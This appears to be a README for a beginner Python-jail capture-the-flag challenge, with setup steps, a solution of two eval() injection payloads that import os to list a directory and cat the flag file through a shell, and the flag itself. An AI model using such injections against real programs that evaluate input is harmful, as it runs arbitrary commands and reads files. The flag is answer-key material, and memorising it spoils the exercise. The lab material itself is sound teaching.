# PyJail-Intro 1

### Difficulty: Beginner
### Objective: `eval()`

## Setting Up
Install both the `pyjail.py` and `flag-afd3ca89be90859c70e89a903f09f9fb.txt` files into the same directory. Then, just execute the python script to start the challenge. 


## Solution

`__import__('os').listdir('.')`

`__import__('os').system('cat flag-afd3ca89be90859c70e89a903f09f9fb.txt')`

### Flag 
>flag{93da9b115c23778dafd95da03f642d48}
